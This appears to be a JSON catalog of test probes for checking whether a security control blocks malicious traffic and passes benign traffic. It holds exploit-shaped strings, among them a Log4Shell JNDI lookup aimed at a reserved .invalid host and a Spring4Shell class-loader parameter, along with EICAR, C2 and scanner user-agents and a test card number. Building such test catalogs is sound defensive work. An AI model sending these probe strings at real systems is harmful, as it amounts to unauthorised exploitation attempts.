{
  "version": 1,
  "note": "Fixed MINION-POC probe catalog. Every payload is INERT BY CONSTRUCTION — a test string the reflector only ever hashes, never executes or resolves — mirroring how secvitals' DLP/exploit packs stay safe (EICAR is a benign AV test string; the JNDI reference points at the RFC 2606 reserved .invalid TLD and is never resolved; the PAN is the universal 4111 test value; the UA/id strings are just strings). Malicious probes SHOULD be stopped by an effective control; benign probes should pass untouched. `expect` is the catalog's claim, kept strictly separate from what is observed.",
  "probes": [
    {
      "id": "control-canary",
      "class": "benign",
      "role": "control",
      "label": "Control canary (benign heartbeat)",
      "threat": "none",
      "payload": "SECV-MINION-CANARY benign end-to-end heartbeat",
      "expect": "arrive"
    },
    {
      "id": "benign-article",
      "class": "benign",
      "label": "Benign web content (article text)",
      "threat": "none",
      "payload": "Quarterly results were in line with guidance and the board approved a dividend.",
      "expect": "arrive"
    },
    {
      "id": "benign-api-json",
      "class": "benign",
      "label": "Benign API request (normal JSON)",
      "threat": "none",
      "payload": "{\"user\":\"alice\",\"action\":\"login\",\"ok\":true}",
      "expect": "arrive"
    },
    {
      "id": "benign-form-post",
      "class": "benign",
      "label": "Benign form submission",
      "threat": "none",
      "payload": "name=Jordan&subject=Meeting+notes&body=See+you+at+3pm",
      "expect": "arrive"
    },
    {
      "id": "mal-eicar",
      "class": "malicious",
      "label": "EICAR anti-malware test string",
      "threat": "malware",
      "payload": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
      "expect": "block"
    },
    {
      "id": "mal-log4shell",
      "class": "malicious",
      "label": "Log4Shell JNDI probe (CVE-2021-44228)",
      "threat": "exploit",
      "payload": "token=${jndi:ldap://exploit.invalid/a}",
      "expect": "block"
    },
    {
      "id": "mal-c2-ua",
      "class": "malicious",
      "label": "Malware C2 user-agent",
      "threat": "c2",
      "payload": "User-Agent: BlackSun; beacon=1",
      "expect": "block"
    },
    {
      "id": "mal-scanner-ua",
      "class": "malicious",
      "label": "Scanner user-agent (sqlmap)",
      "threat": "recon",
      "payload": "User-Agent: sqlmap/1.7#stable (http://sqlmap.org)",
      "expect": "block"
    },
    {
      "id": "mal-dlp-pan",
      "class": "malicious",
      "label": "Data exfil — synthetic test PAN",
      "threat": "dlp",
      "payload": "card_number=4111111111111111&exp=12/29",
      "expect": "block"
    },
    {
      "id": "mal-uid-root",
      "class": "malicious",
      "label": "GPL id-check response (uid=0 root)",
      "threat": "recon",
      "payload": "uid=0(root) gid=0(root) groups=0(root)",
      "expect": "block"
    },
    {
      "id": "mal-spring4shell",
      "class": "malicious",
      "label": "Spring4Shell class-loader probe (sanitizable)",
      "threat": "exploit",
      "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
      "expect": "block"
    }
  ]
}
